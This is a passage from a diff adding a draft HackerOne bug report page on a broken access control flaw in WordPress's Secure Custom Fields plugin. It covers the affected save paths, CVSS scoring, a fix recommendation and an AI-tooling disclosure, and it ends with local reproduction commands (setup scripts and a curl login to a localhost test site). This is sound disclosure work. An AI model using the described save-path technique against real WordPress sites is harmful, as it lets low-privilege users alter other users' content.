+      <p>Read together, D and E are the point of this report: the exact same attempted write is correctly rejected twice &mdash; direct access, and the REST equivalent of the bidirectional attack &mdash; and <strong>succeeds once</strong>, through the plain classic/Gutenberg save path C demonstrates.</p>
+    </section>
+
+    <section>
+      <span class="section-label">Verified against</span>
+      <h2>Affected versions</h2>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Path</th><th>Result</th><th>Evidence</th></tr></thead>
+          <tbody>
+            <tr><td>Classic / Gutenberg save (<code>wp-admin/post.php</code>)</td><td><strong style="color:var(--bad)">Vulnerable</strong></td><td>Proof C</td></tr>
+            <tr><td>REST API (<code>wp/v2/posts</code>, <code>acf</code> field)</td><td style="color:var(--ok)">Not vulnerable &mdash; 403</td><td>Proof E</td></tr>
+            <tr><td>Direct edit of the victim post</td><td style="color:var(--ok)">Not vulnerable &mdash; 403</td><td>Proof D</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p class="muted">Tested against commit <code>99cd25279b067f23afc93a75897739660a74da26</code> &mdash; current <code>trunk</code>, the shipping <code>6.9.5</code> release: the same release whose own changelog documents the partial fix.</p>
+    </section>
+
+    <section>
+      <span class="section-label">Impact</span>
+      <h2>Attacker privilege, impact, and CVSS</h2>
+      <p><code>author1</code>, role <strong>Author</strong> &mdash; the lowest role SCF's UI lets you attach a Relationship field to by default. Confirmed via Proof D that this account has zero standing access to the victim post. <strong>User interaction: none.</strong> The entire chain is a single ordinary save of the attacker's own content.</p>
+      <p>Any user who can edit an object carrying a bidirectional-enabled field (on by default) can force a write into <strong>any other object the field is configured to allow selecting</strong> &mdash; not filtered by whether the selecting user can edit the candidate, only by type/status/taxonomy. Concretely: unwanted relationship references injected into content owned by other users or managed by higher-privileged roles, and &mdash; because the same code path handles removals &mdash; existing references silently <em>stripped</em> from objects the attacker cannot edit. Written values are object IDs, not arbitrary strings, so this is not a stored-XSS primitive; it is a directly-demonstrated broken access control / IDOR-class vulnerability.</p>
+
+      <div class="cvss-box">
+        <div class="cvss-score"><div class="num">4.3</div><div class="band">Medium</div></div>
+        <div class="cvss-vector">
+          <code>AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N</code>
+          <p>Bounded-integrity reading (a specific field's value, not the whole object). Where the bidirectional target field itself carries security/trust semantics, practical integrity impact is higher (<code>I:H</code>), recomputing to <strong>&approx;6.4</strong>. Both are shown rather than picking whichever is more favorable.</p>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <div class="grid2">
+        <div>
+          <span class="section-label">Honest limits</span>
+          <h3 style="margin-top:0;">What this isn't</h3>
+          <ul>
+            <li>Not a content-injection/XSS primitive &mdash; written values are object IDs.</li>
+            <li>Requires a bidirectional field configured and reachable by the attacker's role &mdash; an admin decision, though the feature is on by default and designed for exactly this use.</li>
+            <li>Front-end <code>acf_form()</code> and the Classic Editor plugin weren't separately re-verified &mdash; both use the same <code>save_post</code> mechanism per the code trace, but that's reasoned, not independently tested.</li>
+          </ul>
+        </div>
+        <div>
+          <span class="section-label">Exclusions considered</span>
+          <h3 style="margin-top:0;">Against the program's own list</h3>
+          <ul>
+            <li><em>&ldquo;Admins/editors can post JS&rdquo;</em> &mdash; no JS or <code>unfiltered_html</code> involved anywhere.</li>
+            <li><em>CVSS &lt; 4.0</em> &mdash; 4.3 clears it, shown with reasoning above.</li>
+            <li><em>Out-of-scope plugin</em> &mdash; SCF is explicitly named under &ldquo;Official WordPress plugins.&rdquo;</li>
+            <li>Not scanner output &mdash; every claim manually built, executed, and quoted verbatim.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <span class="section-label">Recommendation</span>
+      <h2>Fix the write path, not each entrypoint</h2>
+      <p>Move the capability check into <code>acf_update_bidirectional_values()</code> itself (or <code>_scf_prepare_bidirectional_update()</code>, which already computes the exact destination list) rather than only pre-flighting it at the REST dispatch layer. That closes the gap for every save entrypoint &mdash; classic form, Gutenberg meta-box-loader, REST, front-end <code>acf_form()</code>, and any programmatic <code>update_field()</code> call &mdash; at once, instead of requiring a separately-added pre-flight hook per entrypoint, which is how this gap happened: two REST-specific pre-flights exist (one gated behind a default-off flag), and the entrypoint the vast majority of saves actually use has neither.</p>
+    </section>
+
+    <section>
+      <span class="section-label">Prior art</span>
+      <h2>Duplicate check</h2>
+      <p>No public CVE or advisory found for this specific issue &mdash; <code>wp-safety.org</code> currently lists Secure Custom Fields as having no known CVEs; a search for &ldquo;Secure Custom Fields bidirectional access control CVE&rdquo; returned only an unrelated, long-fixed admin-only stored XSS in field labels (<code>&le;6.3.8</code> / <code>&le;6.3.6.2</code>) &mdash; different sink, different fix, different versions, predating the bidirectional feature's REST fix by multiple releases. HackerOne's own Hacktivity for this program couldn't be checked directly (network egress to <code>hackerone.com</code> is blocked in my environment), so an undisclosed duplicate can't be ruled out with full certainty.</p>
+    </section>
+
+  </main>
+
+  <footer>
+    <span class="section-label">AI tooling disclosure</span>
+    <p><strong>AI assistance: yes &mdash; substantial.</strong> Tool: Claude (Anthropic), via the Claude Code agentic harness. Used for source review, building and running the local reproduction (including the live HTTP-level exploit and both negative controls above), and drafting this report. Every technical claim was verified by executing it against a real local install; quoted output is real observed output, not narration. I have reviewed this report in full and take responsibility for its content.</p>
+
+    <details class="repro">
+      <summary>Local reproduction commands</summary>
+      <div class="code-wrap">
+        <pre><code><span class="tok-c"># setup</span>
+php /tmp/scf-bidir-test/setup.php            <span class="tok-c"># creates users, posts</span>
+php /tmp/scf-bidir-test/create_fields.php    <span class="tok-c"># creates the bidirectional field group</span>
+php /tmp/scf-bidir-test/fix_rest.php         <span class="tok-c"># enables show_in_rest on the field group</span>
+
+<span class="tok-c"># real HTTP login as author1</span>
+curl -s -c author.jar -X POST &quot;http://127.0.0.1:8890/wp-login.php&quot; \
+  --data-urlencode &quot;log=author1&quot; --data-urlencode &quot;pwd=TestAuthorPass!2026&quot; \
+  --data-urlencode &quot;wp-submit=Log In&quot; --data-urlencode &quot;redirect_to=http://127.0.0.1:8890/wp-admin/&quot;
+
+<span class="tok-c"># scrape real nonces from the real edit screen, then POST the exploit / negative controls</span>
+<span class="tok-c"># — see "Reproduction" above for the exact requests.</span></code></pre>
+      </div>
+    </details>
+
+    <p class="footer-note">Program: hackerone.com/wordpress &middot; Asset: Secure Custom Fields &middot; Commit 99cd25279b067f23afc93a75897739660a74da26 &middot; Draft, not yet submitted</p>
+  </footer>
+
+</div>
